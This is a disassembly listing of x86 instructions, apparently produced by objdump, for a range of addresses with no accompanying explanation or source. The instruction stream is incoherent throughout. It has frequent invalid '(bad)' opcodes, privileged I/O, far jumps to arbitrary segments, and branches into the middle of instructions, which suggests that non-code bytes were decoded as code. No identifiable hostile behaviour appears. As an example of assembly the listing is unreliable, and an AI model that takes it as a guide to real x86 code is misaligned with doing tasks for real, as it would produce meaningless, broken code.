  4049ba:	repz data16 mov ch,0xb7
  4049be:	adc    ecx,ebp
  4049c0:	push   ebx
  4049c1:	(bad)  
  4049c3:	adc    bh,ah
  4049c5:	fwait
  4049c6:	sbb    DWORD PTR [eax],0x20
  4049c9:	loop   0x40497e
  4049cb:	push   esi
  4049cc:	pop    ecx
  4049cd:	popa   
  4049ce:	and    BYTE PTR [eax-0x4b],bh
  4049d1:	lds    ecx,FWORD PTR [esp+ebp*2-0xed9666e]
  4049d8:	test   al,0x37
  4049da:	jmp    0xa165:0xed803978
  4049e1:	addr16 nop
  4049e3:	dec    ebp
  4049e4:	stos   BYTE PTR es:[edi],al
  4049e5:	(bad)  
  4049e7:	mov    WORD PTR ds:0xb98af81,cs
  4049ed:	es push es
  4049ef:	ja     0x404a04
  4049f1:	add    BYTE PTR [edi+eax*4+0x4a],al
  4049f5:	xor    BYTE PTR [eax-0x5e],ah
  4049f8:	push   0x583d50c7
  4049fd:	sbb    al,dl
  4049ff:	mov    eax,0xa66f6d7d
  404a04:	jmp    0x4049fc
  404a06:	xchg   ebp,eax
  404a07:	cmp    DWORD PTR [ebx-0x75],edx
  404a0a:	xor    DWORD PTR [ecx],0xbc72b2f3
  404a10:	dec    esp
  404a11:	inc    ebp
  404a12:	dec    edx
  404a13:	je     0x4049eb
  404a15:	push   ecx
  404a16:	mov    ds:0xd331ae4f,eax
  404a1b:	les    esp,FWORD PTR [edx-0x7c]
  404a1e:	loope  0x404a74
  404a20:	fnstsw WORD PTR [esi-0x6d]
  404a23:	dec    ebp
  404a24:	adc    DWORD PTR [edi+0x6cedcec5],0xd4cf7c71
  404a2e:	mov    cx,0xadde
  404a32:	add    BYTE PTR [ecx+ebx*8-0x42],0xbb
  404a37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a38:	call   0xaa5:0x7dd63ec7
  404a3f:	inc    ebp
  404a40:	dec    esi
  404a41:	ds imul esi,esi,0xb62c18fa
  404a48:	sub    dh,ah
  404a4a:	push   edx
  404a4b:	jmp    0x404aca
  404a4d:	loop   0x4049e3
  404a4f:	ret    0xf508
  404a52:	push   esp
  404a53:	push   es
  404a54:	mov    al,BYTE PTR [esi]
  404a56:	jmp    0xc205fb88
  404a5b:	inc    edi
  404a5c:	push   ebx
  404a5d:	adc    edi,DWORD PTR [edi+esi*1]
  404a60:	ins    DWORD PTR es:[edi],dx
  404a61:	inc    ebx
  404a62:	jb     0x404ace
  404a64:	pusha  
  404a65:	das    
  404a66:	or     edi,DWORD PTR [ecx-0x46]
  404a69:	push   esp
  404a6a:	pop    es
  404a6b:	mov    eax,ds:0x75176cc7
  404a70:	into   
  404a71:	dec    esi
  404a72:	xchg   ebp,eax
  404a73:	add    eax,0x89d5da24
  404a78:	addr16 sub edx,esi
  404a7b:	add    al,0xde
  404a7d:	in     al,0xad
  404a7f:	mov    ch,0xbd
  404a81:	jecxz  0x404ae6
  404a83:	adc    al,0x2
  404a85:	push   ds
  404a86:	mov    al,ds:0xb4473185
  404a8b:	sub    eax,0x6317a50e
  404a90:	das    
  404a91:	leave  
  404a92:	sbb    esp,edx
  404a94:	std    
  404a95:	jp     0x404a39
  404a97:	cmp    ecx,ebp
  404a99:	cmp    BYTE PTR [ebx+esi*8],0x5a
  404a9d:	dec    ebx
  404a9e:	xchg   ebp,eax
  404a9f:	repnz xor al,cl
  404aa2:	sahf   
  404aa3:	int    0x3
  404aa5:	loopne 0x404b1d
  404aa7:	sbb    DWORD PTR [ecx+0x3d],esp
  404aaa:	rcr    BYTE PTR [esi],1
  404aac:	jecxz  0x404a36
  404aae:	sbb    al,0x20
  404ab0:	pop    ecx
  404ab1:	adc    al,0x11
  404ab3:	arpl   WORD PTR [ebp-0x283b42b3],ax
  404ab9:	push   edx
  404aba:	xor    eax,0xf262a918
  404abf:	nop
  404ac0:	popf   
  404ac1:	push   0xc
  404ac3:	lahf   
  404ac4:	pop    esp
  404ac5:	xor    eax,edi
  404ac7:	jnp    0x404b36
  404ac9:	div    DWORD PTR ss:[edi-0x2ee45f2c]
  404ad0:	call   0x65b1:0x93c33eed
  404ad7:	ficom  DWORD PTR [esi]
  404ad9:	push   esp
  404ada:	outs   dx,BYTE PTR ds:[esi]
  404adb:	jno    0x404b50
  404add:	faddp  st(1),st
  404adf:	outs   dx,BYTE PTR ds:[esi]
  404ae0:	repnz cli 
  404ae2:	xchg   edx,eax
  404ae3:	cmp    edi,esp
  404ae5:	addr16 xchg ecx,eax
  404ae8:	and    al,0x14
  404aea:	pop    esi
  404aeb:	add    DWORD PTR [eax-0x5ae92d3b],0x49167376
  404af5:	jg     0x404af7
  404af7:	in     eax,0x15
  404af9:	xchg   esi,eax
  404afa:	leave  
  404afb:	push   0x73b90b72
  404b00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b01:	fnstenv [ebx]
  404b03:	fisub  DWORD PTR [edx-0x15faeb13]
  404b09:	jecxz  0x404b75
  404b0b:	add    al,ah
  404b0d:	into   
  404b0e:	pop    ss
  404b0f:	das    
  404b10:	mov    DWORD PTR [edi-0x2efe486f],ebp
  404b16:	loope  0x404af4
  404b18:	ins    BYTE PTR es:[edi],dx
  404b19:	pushf  
  404b1a:	sub    BYTE PTR [ecx+0x18],ch
  404b1d:	sbb    bh,BYTE PTR [ebx]
  404b1f:	shl    BYTE PTR [eax+0x0],0x80
  404b23:	aad    0xe2
  404b25:	lahf   
  404b26:	mov    cl,0x40
  404b28:	mov    ecx,0x737942e7
  404b2d:	or     ebp,ecx
  404b2f:	push   0xa9421ffd
  404b34:	loop   0x404aef
  404b36:	or     DWORD PTR [eax-0x616a63b6],esi
  404b3c:	mov    dl,0x4d
  404b3e:	psraw  mm3,QWORD PTR [esi]
  404b41:	xchg   edx,eax
  404b42:	(bad)  
  404b43:	es (bad) 
  404b45:	push   0x51
  404b47:	(bad)  
  404b49:	xor    al,0x53
  404b4b:	inc    esi
  404b4c:	arpl   WORD PTR [edi],cx
  404b4e:	test   bh,al
  404b50:	push   ebx
  404b51:	mov    al,ds:0x835bb62f
  404b56:	out    0x6c,eax
  404b58:	mov    bl,0xae
  404b5a:	mov    ah,0x42
  404b5c:	in     al,0xbd
  404b5e:	pushf  
  404b5f:	and    bh,0x19
  404b62:	xchg   edi,eax
  404b63:	dec    edi
  404b64:	xchg   esp,eax
  404b65:	(bad)  
  404b67:	add    eax,0xa53c7d7e
  404b6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b6d:	mov    ecx,0x445c1801
  404b72:	xor    eax,0xe85ce42c
  404b77:	imul   BYTE PTR [eax]
  404b79:	in     eax,dx
  404b7a:	mov    eax,0x627918e0
  404b7f:	lock mov al,0x92
  404b82:	fwait
  404b83:	int    0xef
  404b85:	fidivr WORD PTR [ecx-0x6a86397b]
  404b8b:	xchg   ebx,eax
  404b8c:	arpl   WORD PTR [eax-0x75],bx
  404b8f:	bound  ecx,QWORD PTR [ebp+0x32a2d9a5]
  404b95:	scas   al,BYTE PTR es:[edi]
  404b96:	cmp    edx,DWORD PTR [ecx]
  404b98:	push   ds
  404b99:	fwait
  404b9a:	pop    ebx
  404b9b:	fist   DWORD PTR [ecx-0x487cf538]
  404ba1:	add    BYTE PTR [ecx+0x6],ch
  404ba4:	inc    ebx
  404ba5:	fld    TBYTE PTR [edx+0x40]
  404ba8:	cli    
  404ba9:	arpl   WORD PTR [ebx],cx
  404bab:	dec    edx
  404bac:	loop   0x404b40
  404bae:	mov    bl,0x4
  404bb0:	ja     0x404c05
  404bb2:	xchg   edx,eax
  404bb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404bb4:	je     0x404b89
  404bb6:	sub    esi,DWORD PTR [esi+0x4e7ee749]
  404bbc:	adc    eax,0xb2e58434
  404bc1:	fwait
  404bc2:	xor    al,0x88
  404bc4:	mov    gs:0x32bd2c37,al
  404bca:	ss pop esp
  404bcc:	pop    edi
  404bcd:	fwait
  404bce:	sbb    ebp,esi
  404bd0:	mov    bl,0x13
  404bd2:	mov    esi,0x7f38e4ca
  404bd7:	pop    edi
  404bd8:	push   ebx
  404bd9:	cmp    al,0x7e
  404bdb:	pop    es
  404bdc:	mov    ecx,0x32cc781
  404be1:	sbb    ecx,DWORD PTR [edi+0x386569dc]
  404be7:	shl    al,0x99
  404bea:	leave  
  404beb:	add    DWORD PTR [ecx],0x2a
  404bee:	aaa    
  404bef:	in     eax,0x35
  404bf1:	jnp    0x404b84
  404bf3:	sbb    edx,DWORD PTR [ebx+ebx*4]
  404bf6:	outs   dx,BYTE PTR ds:[esi]
  404bf7:	sub    al,0x7a
  404bf9:	aad    0x3e
  404bfb:	dec    ebp
  404bfc:	sub    al,0x9e
  404bfe:	push   ax
  404c00:	mov    dh,0x68
  404c02:	or     al,0xbd
  404c04:	mov    edx,0x8f69748a
  404c09:	inc    esi
  404c0a:	sti    
  404c0b:	pop    ebx
  404c0c:	inc    ebp
  404c0d:	je     0x404c4b
  404c0f:	inc    edx
  404c10:	sub    al,0x69
  404c12:	mov    ah,0x7d
  404c14:	int3   
  404c15:	mov    cl,0x2a
  404c17:	sahf   
  404c18:	xlat   BYTE PTR ds:[ebx]
  404c19:	repnz push ecx
  404c1b:	retf   0xb864
  404c1e:	lods   eax,DWORD PTR ds:[esi]
  404c1f:	je     0x404c3b
  404c21:	(bad)  
  404c23:	mov    BYTE PTR [esi+0x3c1849db],ch
  404c29:	(bad)  
  404c2a:	mov    edi,0xf30037de
  404c2f:	out    dx,eax
  404c30:	retf   
  404c31:	sahf   
  404c32:	cld    
  404c33:	mov    ch,0xde
  404c35:	cmp    dh,BYTE PTR [ebx-0x48]
  404c38:	lea    esp,[eax+0x36]
  404c3b:	addr16 retf 
  404c3d:	leave  
  404c3e:	ret    0xd831
  404c41:	push   eax
  404c42:	sub    eax,edx
  404c44:	ffree  st(0)
  404c46:	(bad)  
  404c48:	xchg   ecx,eax
  404c49:	adc    esi,DWORD PTR [edx+0x7589713]
  404c4f:	(bad)
  404c52:	mov    bh,0x92
  404c54:	fidiv  WORD PTR [edx+0x28986604]
  404c5a:	ja     0x404cc5
  404c5c:	jmp    0x98163fdf
  404c61:	dec    esi
  404c62:	adc    al,0x46
  404c64:	fisttp DWORD PTR [ebp+0x74]
  404c67:	nop
  404c68:	add    al,0x16
  404c6a:	enter  0x6d03,0x1f
  404c6e:	add    edx,0x59
  404c71:	fiadd  WORD PTR [ebx+0x37]
  404c74:	es mov edi,0x5ad490af
  404c7a:	jmp    0x34c5291a
  404c7f:	loope  0x404c74
  404c81:	loop   0x404c5d
  404c83:	shl    ebp,cl
  404c85:	dec    ecx
  404c86:	push   esp
  404c87:	push   ds
  404c88:	(bad)  
  404c89:	aad    0x86
  404c8b:	mov    ds:0x582f1fb,al
  404c90:	sbb    DWORD PTR [ebx-0x78],esp
  404c93:	fisttp QWORD PTR [edx+0x589bf132]
  404c99:	fcomp  DWORD PTR [esi+eax*4-0x40d48455]
  404ca0:	jns    0x404c8e
  404ca2:	push   es
  404ca3:	clc    
  404ca4:	cmp    esi,esp
  404ca6:	pop    ecx
  404ca7:	xor    al,0x41
  404ca9:	cmc    
  404caa:	or     al,0x9d
  404cac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404cad:	adc    eax,0x6cb221dd
  404cb2:	sti    
  404cb3:	rol    BYTE PTR [ecx],1
  404cb5:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404cb7:	popf   
  404cb8:	jmp    0x404cb4
  404cba:	add    BYTE PTR [eax],ch
  404cbc:	stos   DWORD PTR es:[edi],eax
  404cbd:	cdq    
  404cbe:	lds    eax,FWORD PTR [esi-0x66323e4d]
  404cc4:	mov    edi,0x6eff2983
  404cc9:	inc    esp
  404cca:	neg    BYTE PTR [ecx]
  404ccc:	or     DWORD PTR [eax-0x2d68fcc6],ecx
  404cd2:	lods   eax,DWORD PTR ds:[esi]
  404cd3:	push   0x54
  404cd5:	(bad)  
  404cd6:	cmp    al,0x11
  404cd8:	jnp    0x404c90
  404cda:	fdivrp st(1),st
  404cdc:	into   
  404cdd:	repz sub ch,BYTE PTR [edi+esi*4-0x2a735820]
  404ce5:	pop    eax
  404ce6:	mov    eax,DWORD PTR [esi+0x6acf9b90]
  404cec:	fs retf 0x9ec6
  404cf0:	sahf   
  404cf1:	inc    ebp
  404cf2:	leave  
  404cf3:	and    edi,DWORD PTR [esi-0x8]
  404cf6:	fcomp  DWORD PTR [ecx]
  404cf8:	test   BYTE PTR [ecx-0x56],ch
  404cfb:	pushf  
  404cfc:	aam    0xd5
  404cfe:	or     eax,0x624668a0
  404d03:	test   dl,cl
  404d05:	jo     0x404cc9
  404d07:	scas   al,BYTE PTR es:[edi]
  404d08:	jno    0x404cff
  404d0a:	ret    
  404d0b:	fnstcw WORD PTR [edi+0x57]
  404d0e:	jbe    0x404d31
  404d10:	shl    BYTE PTR [edx+0x6706381a],cl
  404d16:	mov    al,ds:0xfb749456
  404d1b:	rol    DWORD PTR [edx-0x7a],0xf2
  404d1f:	xchg   DWORD PTR ds:0x92932a86,esp
  404d25:	pop    edi
  404d26:	sub    esp,DWORD PTR [eax+0x8cfe5bb]
  404d2c:	bound  ebp,QWORD PTR [ebx]
  404d2e:	call   0x6ff93c69
  404d33:	push   edi
  404d34:	and    dl,dl
  404d36:	test   eax,0x3e22688d
  404d3b:	jae    0x404cee
  404d3d:	jp     0x404d6c
  404d3f:	mov    bh,al
  404d41:	stc    
  404d42:	ss das 
  404d44:	sbb    ebx,DWORD PTR [edi]
  404d46:	imul   esp,DWORD PTR [edx-0x53],0x25
  404d4a:	xchg   edx,eax
  404d4b:	out    dx,al
  404d4c:	xor    al,BYTE PTR [edi-0x1a]
  404d4f:	loop   0x404d1c
  404d51:	call   0x494c:0x72cf46d4
  404d58:	adc    bl,al
  404d5a:	(bad)  
  404d5b:	mov    ebp,0x5c7d5805
  404d60:	mov    bl,0x2d
  404d62:	mov    eax,ds:0x5c0f7682
  404d67:	add    eax,0xcac10dde
  404d6c:	lods   al,BYTE PTR ds:[esi]
  404d6d:	sub    DWORD PTR [ecx+0x68],ecx
  404d70:	(bad)
  404d73:	ret    
  404d74:	cmp    ebp,DWORD PTR [edi-0x5f]
  404d77:	sub    dh,BYTE PTR [edi+0x72388d10]
  404d7d:	cs dec ebx
  404d7f:	ds dec eax
  404d81:	xchg   esi,eax
  404d82:	in     eax,0xdc
  404d84:	lods   eax,DWORD PTR ds:[esi]
  404d85:	push   esi
  404d86:	aas    
  404d87:	sub    ebx,DWORD PTR [ebx+0xa4b158e]
  404d8d:	into   
  404d8e:	dec    BYTE PTR [ebp-0x5b2d5073]
  404d94:	jecxz  0x404d91
  404d96:	xchg   BYTE PTR [eax-0x1a],dl
  404d99:	push   0x11
  404d9b:	ja     0x404d77
  404d9d:	dec    eax
  404d9e:	fisubr WORD PTR [ebp+0x42]
  404da1:	xor    al,bh
  404da3:	dec    edx
  404da4:	push   ds
  404da5:	mov    eax,ds:0x9394027f
  404daa:	lea    edi,ds:0xf92e0f27
  404db0:	shl    DWORD PTR [edx-0xd],cl
  404db3:	pop    eax
  404db4:	jmp    0x404dbf
  404db6:	mov    ah,0x11
  404db8:	push   ebp
  404db9:	sbb    dh,BYTE PTR [esi-0x28]
  404dbc:	xlat   BYTE PTR ds:[ebx]
  404dbd:	leave  
  404dbe:	popa   
  404dbf:	out    dx,al
  404dc0:	cwde   
  404dc1:	enter  0xd65e,0xbb
  404dc5:	mov    bl,0x76
  404dc7:	fst    DWORD PTR [eax+0x1]
  404dca:	out    dx,al
  404dcb:	push   0x8e839c94
  404dd0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404dd1:	arpl   WORD PTR [ebx-0x15423de5],sp
  404dd7:	loop   0x404ddf
  404dd9:	lock xor cl,BYTE PTR [ebx]
  404ddc:	bound  ecx,QWORD PTR [eax+ebp*1+0x68]
  404de0:	push   cs
  404de1:	inc    esi
  404de2:	adc    al,0xeb
  404de4:	dec    eax
  404de5:	popa   
  404de6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404de7:	jmp    0x44da:0xce2bd661
  404dee:	jecxz  0x404d7a
  404df0:	mov    bh,0x3e
  404df2:	cmp    ecx,esp
  404df4:	xchg   esp,eax
  404df5:	neg    BYTE PTR [esi+ebx*4-0x3e]
  404df9:	or     esp,DWORD PTR [edx]
  404dfb:	xchg   esi,eax
  404dfc:	push   esi
  404dfd:	dec    ebp
  404dfe:	xchg   edi,eax
  404dff:	stc    
  404e00:	jne    0x404e18
  404e02:	cli    
  404e03:	sub    edx,edx
  404e05:	test   esp,ebp
  404e07:	sbb    DWORD PTR [edi+0x22f58a6c],0x90f0556a
  404e11:	push   ds
  404e12:	cs inc esp
  404e14:	pusha  
  404e15:	mov    esi,0xbca40be4
  404e1a:	clc    
  404e1b:	dec    ecx
  404e1c:	loope  0x404dd4
  404e1e:	dec    ebx
  404e1f:	sub    edi,edx
  404e21:	push   esp
  404e22:	cmp    eax,edi
  404e24:	dec    esp
  404e25:	jge    0x404db1
  404e27:	leave  
  404e28:	das    
  404e29:	(bad)  
  404e2a:	mov    es,WORD PTR [ecx+edi*4+0x4d6cc3cc]
  404e31:	das    
  404e32:	scas   eax,DWORD PTR es:[edi]
  404e33:	cmp    ebp,DWORD PTR [edx-0x297cdb17]
  404e39:	rol    DWORD PTR [ecx-0x6e8b50d5],cl
  404e3f:	jmp    0x63f28a2a
  404e44:	clc    
  404e45:	sub    BYTE PTR [eax-0x254d2dc],bl
  404e4b:	mov    ecx,0xcc5294c5
  404e50:	retf   0xf895
  404e53:	pop    esi
  404e54:	push   ebx
  404e55:	(bad)  
  404e56:	sbb    al,0x71
  404e58:	fiadd  WORD PTR [edx+0x3e133432]
  404e5e:	push   esi
  404e5f:	jmp    0x7702:0xd4da3398
  404e66:	xchg   ebx,eax
  404e67:	add    cl,dh
  404e69:	mov    edi,0x76264ad7
  404e6e:	jge    0x404e88
  404e70:	dec    edx
  404e71:	scas   al,BYTE PTR es:[edi]
  404e72:	push   0xffffffbc
  404e74:	push   ecx
  404e75:	sbb    eax,0x3a945f2d
  404e7a:	push   ebp
  404e7b:	jmp    0xdc19d84f
  404e80:	rol    BYTE PTR ds:0x8bd65b74,0x36
  404e87:	xchg   ebx,eax
  404e88:	mov    bl,ch
  404e8a:	imul   eax
  404e8c:	dec    ebx
  404e8d:	das    
  404e8e:	add    al,0xb6
  404e90:	sub    DWORD PTR [esi],0x5e53f808
  404e96:	jmp    0x46a6:0xdec3cf8b
  404e9d:	cmp    DWORD PTR [edi+0x20],esp
  404ea0:	mov    al,0x35
  404ea2:	js     0x404e24
  404ea4:	push   ecx
  404ea5:	pushf  
  404ea6:	jo     0x404ee0
  404ea8:	jnp    0x404ea6
  404eaa:	adc    al,0x4e
  404eac:	imul   edi,DWORD PTR [esi-0x229f2622],0xffffffa7
  404eb3:	or     eax,0x77ef3f27
  404eb8:	dec    ecx
  404eb9:	and    BYTE PTR [ebx+0x69],ch
  404ebc:	pop    edx
  404ebd:	jmp    0x404ec5
  404ebf:	inc    edi
  404ec0:	xor    bh,BYTE PTR [eax+0x32025290]
  404ec6:	sub    DWORD PTR [ebx],0x39
  404ec9:	mov    ecx,gs
  404ecb:	push   0xffffffd0
  404ecd:	inc    ebx
  404ece:	clc    
  404ecf:	jle    0x404ea7
  404ed1:	mov    DWORD PTR [eax-0x9173f2c],edi
  404ed7:	jnp    0x404ed7
  404ed9:	mov    esi,0x1f11fd68
  404ede:	mov    DWORD PTR [ecx+0x1ad19788],esp
  404ee4:	fnstcw WORD PTR [ecx]
  404ee6:	jge    0x404ed0
  404ee8:	sbb    al,0xd3
  404eea:	push   0x70d3053d
  404eef:	loop   0x404e94
  404ef1:	adc    dh,BYTE PTR [ecx+0x32]
  404ef4:	lock mov edx,0x7a53eb15
  404efa:	push   cs
  404efb:	mov    edx,db0
  404efe:	sub    al,BYTE PTR [eax]
  404f00:	cmp    bh,dl
  404f02:	sahf   
  404f03:	ror    DWORD PTR [edx+0x46646328],1
  404f09:	popf   
  404f0a:	jge    0x404ec7
  404f0c:	aas    
  404f0d:	enter  0x837a,0xdc
  404f11:	jae    0x404f8e
  404f13:	add    eax,edi
  404f15:	mov    edx,0xbbc67004
  404f1a:	mov    esi,DWORD PTR [edi+0x39]
  404f1d:	imul   esp,DWORD PTR [ecx-0x52f00709],0xdd235830
  404f27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404f28:	jg     0x404f8d
  404f2a:	js     0x404eb9
  404f2c:	mov    bl,0xcd
  404f2e:	mov    ah,0xd2
  404f30:	sub    al,0x3a
  404f32:	repz rcr BYTE PTR [ecx+eiz*2+0x7483cf07],1
  404f3a:	idiv   DWORD PTR [esi-0x19]
  404f3d:	in     al,0xb8
  404f3f:	mov    bl,ah
  404f41:	dec    edx
  404f42:	daa    
  404f43:	or     BYTE PTR [esi+0x5bd243d],ah
  404f49:	mov    esi,0x8d268799
  404f4e:	gs daa 
  404f50:	dec    edi
  404f51:	xchg   edx,eax
  404f52:	ins    DWORD PTR es:[edi],dx
  404f53:	mov    eax,ds:0x4670eeba
  404f58:	aam    0xeb
  404f5a:	mov    bl,0x16
  404f5c:	(bad)  
  404f5d:	out    0x2e,eax
  404f5f:	fs push ss
  404f61:	add    al,BYTE PTR [ecx]
  404f63:	pop    es
  404f64:	test   eax,0xd59de5ac
  404f69:	enter  0x46c9,0xb5
  404f6d:	jge    0x404fa7
  404f6f:	jg     0x404ff0
  404f71:	popa   
  404f72:	repnz std 
  404f74:	call   0xdd91707d
  404f79:	cmc    
  404f7a:	push   0x4a
  404f7c:	inc    ecx
  404f7d:	(bad)  
  404f7f:	aam    0x2e
  404f81:	dec    ecx
  404f82:	jmp    0x99f9:0xb28f0fd1
  404f89:	push   ss
  404f8a:	pop    esp
  404f8b:	out    dx,eax
  404f8c:	jecxz  0x404f10
  404f8e:	shl    DWORD PTR [eax+0x56f6bdb9],cl
  404f94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f95:	push   es
  404f96:	pop    es
  404f97:	ins    DWORD PTR es:[edi],dx
  404f98:	push   edi
  404f99:	jmp    0x404f1f
  404f9b:	adc    BYTE PTR [eax-0x46a1f630],bl
  404fa1:	cli    
  404fa2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404fa3:	sub    eax,0x6e25d41a
  404fa8:	fdiv   QWORD PTR [ecx]
  404faa:	push   es
  404fab:	gs dec edi
  404fad:	push   ss
  404fae:	neg    esi
  404fb0:	fbld   TBYTE PTR [ecx-0x3e]
  404fb3:	inc    si
  404fb5:	into   
  404fb6:	fimul  DWORD PTR [edx-0x76]
  404fb9:	dec    edx
  404fba:	imul   ebx,DWORD PTR [edi-0x1e96997d],0x58
  404fc1:	sub    bh,ah
  404fc3:	scas   al,BYTE PTR es:[edi]
  404fc4:	ret    0x9e1f
  404fc7:	repnz out 0x4d,eax
  404fca:	mov    ds:0x45dc6650,eax
  404fcf:	arpl   WORD PTR [edi-0xecf9b13],bp
  404fd5:	ret    
  404fd6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404fd7:	fs xchg ebx,eax
  404fd9:	jns    0x405048
  404fdb:	cdq    
  404fdc:	push   edi
  404fdd:	sahf   
  404fde:	test   DWORD PTR [ebp-0x41],eax
  404fe1:	mov    ebp,0xd26949a0
  404fe6:	std    
  404fe7:	aas    
  404fe8:	jnp    0x404f97
  404fea:	xchg   esp,eax
  404feb:	mov    WORD PTR [edx+0x54],ss
  404fee:	aaa    
  404fef:	jmp    0x404fca
  404ff1:	adc    eax,0x259ccf74
  404ff6:	clc    
  404ff7:	jp     0x405058
  404ff9:	jns    0x404fed
  404ffb:	shl    DWORD PTR [eax],1
  404ffd:	inc    edi
  404ffe:	mov    bl,0xc8
  405000:	adc    DWORD PTR [eax-0x51],esp
  405003:	mov    DWORD PTR [edx+0x29f2a1b6],edi
  405009:	inc    esp
  40500a:	mov    ebx,0x978e8986
  40500f:	dec    eax
  405010:	shr    DWORD PTR [edx+0x42],1
  405013:	mov    bh,0xee
  405015:	xchg   ecx,ebx
  405017:	fld    QWORD PTR [edi+0x7ae9cea5]
  40501d:	jnp    0x404fc8
  40501f:	pop    ebx
  405020:	and    BYTE PTR [esi-0x222bf509],ch
  405026:	and    dl,BYTE PTR [eax+0x3eb54d6b]
  40502c:	or     BYTE PTR [esi],cl
  40502e:	lock loope 0x405063
  405031:	inc    edi
  405032:	sti    
  405033:	mov    edi,0xb7abf1c6
  405038:	lods   al,BYTE PTR ds:[esi]
  405039:	stos   DWORD PTR es:[edi],eax
  40503a:	test   eax,0x8e4ffa
  40503f:	sub    DWORD PTR [ebp+0x4c],eax
  405042:	aas    
  405043:	jne    0x404ff1
  405045:	sti    
  405046:	jmp    0x43c5ab50
  40504b:	sbb    eax,0x10d32243
  405050:	pop    edx
  405051:	aaa    
  405052:	add    eax,0x41d061c7
  405057:	sbb    ecx,DWORD PTR [edi+ebx*2+0x2b]
  40505b:	rol    BYTE PTR [ebx+0x54],cl
  40505e:	dec    esp
  40505f:	xor    esi,eax
  405061:	(bad)  
  405062:	jmp    0x77581a59
  405067:	dec    esp
  405068:	ins    BYTE PTR es:[edi],dx
  405069:	ja     0x4050db
  40506b:	jae    0x4050d4
  40506d:	xor    ah,dh
  40506f:	jbe    0x405064
  405071:	inc    esi
  405072:	pop    ebp
  405073:	sbb    eax,0x88da55ec
  405078:	in     al,0x79
  40507a:	or     BYTE PTR [edx+0x12],dl
  40507d:	scas   eax,DWORD PTR es:[edi]
  40507e:	sbb    BYTE PTR [edi-0x70],al
  405081:	and    BYTE PTR [eax],bh
  405083:	xor    esi,DWORD PTR [esi+ecx*8+0x39]
  405087:	into   
  405088:	add    esi,DWORD PTR cs:[eax+0x1f]
  40508c:	loop   0x405030
  40508e:	push   eax
  40508f:	vpunpckldq xmm7,xmm3,XMMWORD PTR [ecx-0x5b]
  405094:	and    eax,0xf6453b20
  405099:	int    0x3
  40509b:	dec    edi
  40509c:	mov    ch,0x3a
  40509e:	jb     0x4050c9
  4050a0:	push   ecx
  4050a1:	fucom  st(1)
  4050a3:	mov    edi,0x815d1be3
  4050a8:	(bad)  
  4050a9:	sub    eax,0x98a649ca
  4050ae:	and    DWORD PTR [eax+esi*8],esi
  4050b1:	(bad)  
  4050b2:	rol    DWORD PTR [esi+0x1b],0xe6
  4050b6:	int3   
  4050b7:	ins    BYTE PTR es:[edi],dx
  4050b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4050b9:	(bad)  
  4050ba:	cmp    eax,0x54e5e59f
  4050bf:	adc    ch,BYTE PTR [esi+0x37c7893e]
  4050c5:	fst    DWORD PTR [esi]
  4050c7:	or     bl,dh
  4050c9:	loop   0x4050c7
  4050cb:	retf   
  4050cc:	cmp    DWORD PTR [edx+0x58],ebp
  4050cf:	fucomip st,st(7)
  4050d1:	pop    edi
  4050d2:	imul   edx,ebx,0xffffffd0
  4050d5:	retf   
  4050d6:	fild   WORD PTR [ebx+esi*8]
  4050d9:	mov    edi,0x29c5a0d0
  4050de:	push   eax
  4050df:	scas   eax,DWORD PTR es:[edi]
  4050e0:	xor    eax,0xd3f8c9e6
  4050e5:	add    eax,0x27a3d1d
  4050ea:	jecxz  0x4050ed
  4050ec:	mov    cl,0x30
  4050ee:	adc    ch,al
  4050f0:	xor    DWORD PTR [eax-0x24d88445],eax
  4050f6:	mov    eax,0xfed2de29
  4050fb:	leave  
  4050fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4050fd:	sbb    ah,dh
  4050ff:	jge    0x4050d9
  405101:	mov    eax,ds:0x11c42fb9
  405106:	in     al,dx
  405107:	mov    ch,0x9a
  405109:	(bad)  
  40510b:	xchg   esi,eax
  40510c:	xor    BYTE PTR [esi],bh
  40510e:	ret    
  40510f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405110:	xchg   BYTE PTR [ebx-0x2046890c],ch
  405116:	scas   al,BYTE PTR es:[edi]
  405117:	sub    ch,dl
  405119:	mov    ds:0x36ebf502,eax
  40511e:	(bad)  
  40511f:	out    dx,al
  405120:	push   ebx
  405121:	icebp  
  405122:	ds xchg ebp,eax
  405124:	and    eax,0x9ac883ec
  405129:	leave  
  40512a:	fsub   DWORD PTR [edx-0x1b5f807f]
  405130:	fstp   QWORD PTR [edi+esi*8-0x4ddc23]
  405137:	mul    dh
  405139:	inc    eax
  40513a:	jo     0x405171
  40513c:	out    0xd1,al
  40513e:	stos   DWORD PTR es:[edi],eax
  40513f:	stos   BYTE PTR es:[edi],al
  405140:	(bad)
  405143:	sub    edi,DWORD PTR [ebx-0x14239b88]
  405149:	les    ebx,FWORD PTR [eax+ecx*2-0x68b67ad7]
  405150:	repz lds ebp,FWORD PTR [ebp+0x5eb07c6c]
  405157:	and    BYTE PTR [esi-0x4c],0x48
  40515b:	das    
  40515c:	cmp    al,0x90
  40515e:	enter  0xe244,0x59
  405162:	cld    
  405163:	and    eax,DWORD PTR [eax+0x3e]
  405166:	daa    
  405167:	mov    edx,DWORD PTR [eax+0x1d]
  40516a:	add    al,0x9d
  40516c:	and    esp,DWORD PTR ds:0x6f4eb7c4
  405172:	mov    edi,DWORD PTR [ecx+0x23]
  405175:	stos   BYTE PTR es:[edi],al
  405176:	pop    esi
  405177:	jb     0x40512d
  405179:	fwait
  40517a:	jae    0x40512e
  40517c:	cdq    
  40517d:	sti    
  40517e:	push   esi
  40517f:	scas   eax,DWORD PTR es:[edi]
  405180:	inc    eax
  405181:	pop    ebp
  405182:	cs in  eax,dx
